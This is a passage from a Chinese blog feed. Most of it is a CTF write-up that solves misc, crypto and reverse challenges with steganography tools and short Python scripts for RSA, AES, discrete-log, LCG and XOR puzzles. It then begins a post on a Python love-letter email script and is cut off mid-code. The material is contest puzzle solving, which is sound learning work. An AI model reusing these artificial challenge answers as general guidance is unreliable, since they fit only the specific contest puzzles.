+++[- &gt;---- &lt;]&gt;-. ---.+</span><br><span class="line"> +++++ .---- -.++. ++.+.</span><br><span class="line">--.-- .&lt;+++ +[-&gt;+ +++&lt;] &gt;++.&lt; ++++[ -&gt;--- -&lt;]&gt;- </span><br><span class="line">.+.-. ---.+ ++.+. -.+++</span><br><span class="line">+.--- --.&lt;+ +++[- &gt;++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. ----. +.+++ +.---</span><br><span class="line">-.--- .+++. -..&lt;+ +++[- &gt;++++ &lt;]&gt;++ </span><br><span class="line">.&lt;+++ +[-&gt;- ---&lt;] &gt;-.++ +++.- ----.</span><br><span class="line">+++.. ---.+ ++.-- --.+. ..+++ +.-.- ----. +++++ </span><br><span class="line">.---- .+.++ ++.-- --.++</span><br><span class="line">++.-. ----. +.-.+ ++++. </span><br><span class="line">&lt;+++[ -&gt;+++ &lt;]&gt;++ ++.&lt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">  &lt;/html&gt;</span><br><span class="line">&#x27;));&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>直接看到由+[ &gt;组成的特殊编码，使用Brainfuck解码得到16进制数字，进行16进制转ascii得到flag</p><h3 id="4096"><a href="#4096" class="headerlink" title="4096"></a>4096</h3><p>打开web环境看到是一个小游戏，所以我们先查看一下他的缓存数据，可以看到存在多个JS文件，根据经验js当中往往会存在跟flag有关的信息，另外我们可以看到favicon.png的位置很特殊，并不是在网站的图标位置，所以我们一会把它下载下来查看一下。</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220527174446990.png" alt="image-20220527174446990"></p><p>首先查看一下js文件在local_storage_manager.js当中发现特殊JS,两次base64解码得到部分flag。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getPartFlag</span>(<span class="params">score</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (score &gt; <span class="number">10000</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Q29uZ3JhdHVsYXRpb25zLCB0aGlzIGlzIHBhcnQgb2YgdGhlIGZsYWc6IE5HVmxOeTFpTmpjekxUazNNV1E0TVdZNFlqRTNOMzA9Lg==&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们再来看一下favicon.png这张图片，使用zsteg查看是否存在特殊信息，我们可以看到图片中包含一个wav文件，使用zsteg将1.wav分离。并在wav文件中分离出带密码的压缩包。</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220527174502462.png" alt="image-20220527174502462"></p><p>将分离后的1.wav拖入Audacity,发现音频开头和结尾部分存在拨号音，使用拨号音识别器得到一串倒序排列的手机号码，题目做到这里我遇到了困难，因为在我了解的音频隐写中，方法都试过解不出来题目，于是把这个题先放在一边，在我翻看网上的WP的时候注意到了一种音频隐写方式–SSTVB，这里放出文章链接<a href="https://blog.csdn.net/mochu7777777/article/details/109882441">UTCTF2020]sstv_末 初的博客-CSDN博客</a>，因为看到音频中间部分的频谱图和这道题目很相似，于是进行尝试，成功获得一张图片。按照图片提示知道压缩包密码。</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220527174510803.png" alt="image-20220527174510803"></p><p>解开压缩包，得到一张图片，使用gaps进行拼图。</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220527174519343.png" alt="image-20220527174519343"></p><p>得到下图,将图中字符串拼成一段base64得到前一段flag，与js文件中的flag组成，完整的flag。</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220527174532452.png" alt="image-20220527174532452"></p><h3 id="Easy-word"><a href="#Easy-word" class="headerlink" title="Easy word"></a>Easy word</h3><p>原题直接上链接<a href="https://blog.csdn.net/qq_44768749/article/details/102673212"> word宏加密的破解_　　筱的博客-CSDN博客_word宏密码</a></p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><p>已知n,c,e求d和m，最简单的RSA题目直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">p =  <span class="number">165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973971467</span></span><br><span class="line">q =  <span class="number">165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973969401</span></span><br><span class="line">e =  <span class="number">65537</span></span><br><span class="line">c =  <span class="number">14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854</span></span><br><span class="line">n =  <span class="number">27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267</span></span><br><span class="line">d = libnum.invmod(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)   <span class="comment"># m 的十进制形式</span></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">string = long_to_bytes(m)  <span class="comment"># m明文</span></span><br><span class="line"><span class="built_in">print</span>(string)  <span class="comment"># 结果为 b‘ m ’ 的形式</span></span><br></pre></td></tr></table></figure><h3 id="babyAES"><a href="#babyAES" class="headerlink" title="babyAES"></a>babyAES</h3><p>最基础的AES直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">iv = <span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line">c = <span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">flag = aes.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="ezDLP"><a href="#ezDLP" class="headerlink" title="ezDLP"></a>ezDLP</h3><p>离散对数问题，网上找到的脚本进行改进</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">m = <span class="number">19</span></span><br><span class="line">c = <span class="number">199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162</span></span><br><span class="line">n = <span class="number">335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fl=sympy.discrete_log(n,c,m)</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(fl)[<span class="number">2</span>:]))<span class="comment">#十六进制输出</span></span><br><span class="line"><span class="comment">#十六进制转ascii码</span></span><br><span class="line">ag = fl</span><br><span class="line">al = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ag), <span class="number">2</span>):</span><br><span class="line">    b = ag[i:i + <span class="number">2</span>]</span><br><span class="line">    al.append(<span class="built_in">chr</span>(<span class="built_in">int</span>(b, <span class="number">16</span>)))</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(al)</span><br><span class="line"><span class="built_in">print</span> (flag)</span><br></pre></td></tr></table></figure><h3 id="ezStram"><a href="#ezStram" class="headerlink" title="ezStram"></a>ezStram</h3><p>流密码题目求出seed随机数种子的值，将值带入后求出明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">3939333498</span></span><br><span class="line">b = <span class="number">3662432446</span></span><br><span class="line">m = <span class="number">2271373817</span></span><br><span class="line">seed = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">a,b,m,seed</span>):</span><br><span class="line">    seed = (a*seed+b)%m</span><br><span class="line">    <span class="keyword">return</span> seed &gt;&gt; <span class="number">16</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">next1</span>(<span class="params">a,b,m,seed</span>):</span><br><span class="line">    seed = (a*seed+b)%m</span><br><span class="line">    seedd = (a*seed+b)%m</span><br><span class="line">    <span class="keyword">return</span> seedd &gt;&gt; <span class="number">16</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    seed1 = <span class="built_in">next</span>(a,b,m,seed)</span><br><span class="line">    <span class="keyword">if</span> seed1 == <span class="number">17362</span>:</span><br><span class="line">        seed2 = next1(a,b,m,seed)</span><br><span class="line">        <span class="keyword">if</span> seed2 == <span class="number">20624</span>:</span><br><span class="line">            <span class="built_in">print</span>(seed)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    seed += <span class="number">1</span></span><br><span class="line"><span class="comment">#104984523</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = <span class="number">3939333498</span></span><br><span class="line">        self.b = <span class="number">3662432446</span></span><br><span class="line">        self.m = <span class="number">2271373817</span></span><br><span class="line">        self.seed = <span class="number">104984523</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.a*self.seed+self.b) % self.m</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">output</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;a = &#123;&#125;nb = &#123;&#125;nm = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.a, self.b, self.m))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;state1 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.<span class="built_in">next</span>()))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;state2 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.<span class="built_in">next</span>()))</span><br><span class="line">lcg = LCG()</span><br><span class="line">lcg.output()</span><br><span class="line">cipher = <span class="number">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span></span><br><span class="line">cipher2 = long_to_bytes(cipher)</span><br><span class="line"><span class="built_in">print</span>(cipher2)</span><br><span class="line">c = <span class="string">b&#x27;&#x27;</span>.join([long_to_bytes(cipher2[i] ^ (lcg.<span class="built_in">next</span>() % <span class="number">10</span>))</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher2))])</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(c))</span><br></pre></td></tr></table></figure><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="simpleXOR"><a href="#simpleXOR" class="headerlink" title="simpleXOR"></a>simpleXOR</h3><p>使用IDA打开文件找到main函数，反编译看到程序基本运行逻辑，原代码的逻辑是将v7 &#x3D;247与v5[i]+i进行异或运算得到的数据与result进行比较，那我们进行逆向的话，就需要先将&amp;result和v7进行逆向，然后得到的数-i就是最终结果，脚本放在下面。</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220527174548401.png" alt="image-20220527174548401"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">0xB3</span>,<span class="number">0x91</span>,<span class="number">0x82</span>,<span class="number">0x80</span>,<span class="number">0xC3</span>,<span class="number">0x9B</span>,<span class="number">0xCE</span>,<span class="number">0x75</span>,<span class="number">0xCF</span>,<span class="number">0x9C</span>,<span class="number">0x9A</span>,<span class="number">0x85</span>,<span class="number">0x85</span>,<span class="number">0xCD</span>,<span class="number">0xB8</span>,<span class="number">0x84</span>,<span class="number">0xAA</span>,<span class="number">0x7D</span>,<span class="number">0xBD</span>,<span class="number">0xBB</span>,<span class="number">0xB1</span>,<span class="number">0xB5</span>,<span class="number">0x96</span>,<span class="number">0x71</span>,<span class="number">0x8D</span>,<span class="number">0x9E</span>,<span class="number">0x86</span>,<span class="number">0xBF</span>,<span class="number">0x73</span>,<span class="number">0xA8</span>,<span class="number">0xA3</span>,<span class="number">0x9C</span>,<span class="number">0x83</span>,<span class="number">0x65</span>,<span class="number">0x9E</span>,<span class="number">0x57</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="built_in">len</span>(list1):</span><br><span class="line">        flag += <span class="built_in">chr</span>((<span class="number">0xF7</span>^list1[i])-i)  </span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="phpdest"><a href="#phpdest" class="headerlink" title="phpdest"></a>phpdest</h3><p>BUUCTF上面的原题 ：<a href="https://blog.csdn.net/qq_46263951/article/details/119545605">WMCTF2020]Make PHP Great Again_Uzero.的博客-CSDN博客</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220527174928597.png&quot; alt=&quot;image-20220527174928597&quot;&gt;&lt;/p&gt;
&lt;h2 i</summary>
      
    
    
    
    
    <category term="CTF Writeup" scheme="http://www.beigui.xyz/tags/CTF-Writeup/"/>
    
  </entry>
  
  <entry>
    <title>关于拒绝重复造轮子那点事</title>
    <link href="http://www.beigui.xyz/2022/05/14/love-mail-pro/"/>
    <id>http://www.beigui.xyz/2022/05/14/love-mail-pro/</id>
    <published>2022-05-14T13:56:10.000Z</published>
    <updated>2022-09-17T09:16:49.499Z</updated>
    
    <content type="html"><![CDATA[<p>马上就520了不知道各位有没有为女朋友&#x2F;男朋友准备好礼物呢，反正北轨我呢除了准备了一份礼物外还发挥自己的专业能力，为女朋友送上一点小惊喜，那就是今天的主题——如何实现用python自动发送一封爱意满满的邮件</p><h2 id="拒绝造轮子"><a href="#拒绝造轮子" class="headerlink" title="拒绝造轮子"></a>拒绝造轮子</h2><p>当你遇到一个问题的时候第一反应一定不要是自己想办法解决，一定要问度娘！！！！所以当我遇到脑海之中产生给小苏一个特别的礼物的想法的时候，我第一时间询问了度娘的意见，结果是“<strong>满载而归</strong>”，度娘并没有给我一个满意的<del>答案</del>（轮子），这时我把目光投向了github，在github中我找到了腹黑前辈的一个项目名叫<strong>love_mail</strong>。在我看完这个项目的readme之后我发现这个项目不就是我梦中的那个它嘛😍感谢腹黑哥哥</p><h2 id="旧轮子介绍"><a href="#旧轮子介绍" class="headerlink" title="旧轮子介绍"></a>旧轮子介绍</h2><p> 在我找到这个程序之后第一时间对程序进行了测试，程序的逻辑并不难理解，首先开头除去必要模块之外，就是下面的配置信息，依次填好</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220514221735.png"></p><p> 在配置完基本信息后是六个定义函数，分别用来计算纪念日天数(get_day())、获取天气信息(get_weathertip())、获取彩虹屁(get_chp())和理出获取到的最近三天的天气信息(get_weather())、获取图片(get_image())、获取今天日期(get_today())。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_day</span>():</span><br><span class="line">    d1 = datetime.datetime.strptime(special_day, <span class="string">&#x27;%Y-%m-%d&#x27;</span>)</span><br><span class="line">    d2 = datetime.datetime.strptime(datetime.datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d&#x27;</span>), <span class="string">&#x27;%Y-%m-%d&#x27;</span>)</span><br><span class="line">    delta = d2 - d1</span><br><span class="line">    <span class="keyword">return</span> delta.days</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_weathertip</span>():</span><br><span class="line">    url = <span class="string">&quot;https://tianqi.moji.com/weather/china/%s/%s&quot;</span>%(province,city)</span><br><span class="line">    resp = requests.get(url)</span><br><span class="line">    soup = BeautifulSoup(resp.text,<span class="string">&quot;html5lib&quot;</span>,from_encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    all_tertiaryconsumers = soup.find_all(class_=<span class="string">&#x27;wea_tips clearfix&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> tertiaryconsumer <span class="keyword">in</span> all_tertiaryconsumers:</span><br><span class="line">        <span class="keyword">return</span> re.search(<span class="string">&#x27;&lt;em&gt;(.+?)&lt;/em&gt;&#x27;</span>,<span class="built_in">str</span>(tertiaryconsumer)).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_chp</span>():</span><br><span class="line">    url = <span class="string">&quot;https://api.shadiao.app/chp&quot;</span></span><br><span class="line">    resp = requests.get(url)</span><br><span class="line">    a=resp.json()</span><br><span class="line">    data_trunk = a[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">    text = data_trunk[<span class="string">&#x27;text&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_weather</span>():</span><br><span class="line">    url = <span class="string">&quot;https://tianqi.moji.com/weather/china/%s/%s&quot;</span>%(province,city)</span><br><span class="line">    resp = requests.get(url)</span><br><span class="line">    soup = BeautifulSoup(resp.text,<span class="string">&quot;html5lib&quot;</span>,from_encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    all_tertiaryconsumers = soup.find_all(class_=<span class="string">&#x27;days clearfix&#x27;</span>) </span><br><span class="line">    html = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> tertiaryconsumer <span class="keyword">in</span> all_tertiaryconsumers:</span><br><span class="line">        day = tertiaryconsumer.find(name=<span class="string">&#x27;a&#x27;</span>).text</span><br><span class="line">        url = re.search(<span class="string">&#x27;src=&quot;(.+?)&quot;&#x27;</span>,<span class="built_in">str</span>(tertiaryconsumer)).group(<span class="number">1</span>)</span><br><span class="line">        weather = re.search(<span class="string">&#x27;&lt;img alt=&quot;(.+?)&quot;&#x27;</span>,<span class="built_in">str</span>(tertiaryconsumer)).group(<span class="number">1</span>)</span><br><span class="line">        temperature = re.search(<span class="string">&#x27;(\w+° \/ \w+°)&#x27;</span>,<span class="built_in">str</span>(tertiaryconsumer)).group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;level_1&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(tertiaryconsumer):</span><br><span class="line">            WindLevel = tertiaryconsumer.find(class_=<span class="string">&#x27;level_1&#x27;</span>).text.strip()</span><br><span class="line">            color = <span class="string">&#x27;#8fc31f&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;level_2&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(tertiaryconsumer):</span><br><span class="line">            WindLevel = tertiaryconsumer.find(class_=<span class="string">&#x27;level_2&#x27;</span>).text.strip()</span><br><span class="line">            color = <span class="string">&#x27;#d7af0e&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;level_3&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(tertiaryconsumer):</span><br><span class="line">            WindLevel = tertiaryconsumer.find(class_=<span class="string">&#x27;level_3&#x27;</span>).text.strip()</span><br><span class="line">            color = <span class="string">&#x27;#f39800&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;level_4&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(tertiaryconsumer):</span><br><span class="line">            WindLevel = tertiaryconsumer.find(class_=<span class="string">&#x27;level_4&#x27;</span>).text.strip()</span><br><span class="line">            color = <span class="string">&#x27;#e2361a&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;level_5&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(tertiaryconsumer):</span><br><span class="line">            WindLevel = tertiaryconsumer.find(class_=<span class="string">&#x27;level_5&#x27;</span>).text.strip()</span><br><span class="line">            color = <span class="string">&#x27;#5f52a0&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;level_6&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(tertiaryconsumer):</span><br><span class="line">            WindLevel = tertiaryconsumer.find(class_=<span class="string">&#x27;level_6&#x27;</span>).text.strip()</span><br><span class="line">            color = <span class="string">&#x27;#631541&#x27;</span></span><br><span class="line">        html += <span class="string">&quot;&quot;&quot;&lt;div style=&quot;display: flex;margin-top:5px;height: 30px;line-height: 30px;justify-content: space-around;align-items: center;&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;span style=&quot;width:15%%; text-align:center;&quot;&gt;%s&lt;/span&gt;</span></span><br><span class="line"><span class="string">        &lt;div style=&quot;width:10%%; text-align:center;&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;img style=&quot;height:26px;vertical-align:middle;&quot; src=&#x27;%s&#x27; alt=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;span style=&quot;width:25%%; text-align:center;&quot;&gt;%s&lt;/span&gt;</span></span><br><span class="line"><span class="string">        &lt;div style=&quot;width:35%%; &quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;span style=&quot;display:inline-block;padding:0 8px;line-height:25px;color:%s; border-radius:15px; text-align:center;&quot;&gt;%s&lt;/span&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span> % (day, url, temperature, color, WindLevel)</span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_image</span>():</span><br><span class="line">    url = <span class="string">&quot;http://wufazhuce.com/&quot;</span></span><br><span class="line">    resp = requests.get(url)</span><br><span class="line">    soup = BeautifulSoup(resp.text,<span class="string">&quot;html5lib&quot;</span>,from_encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> re.search(<span class="string">&#x27;src=&quot;(.+?)&quot;&#x27;</span>,<span 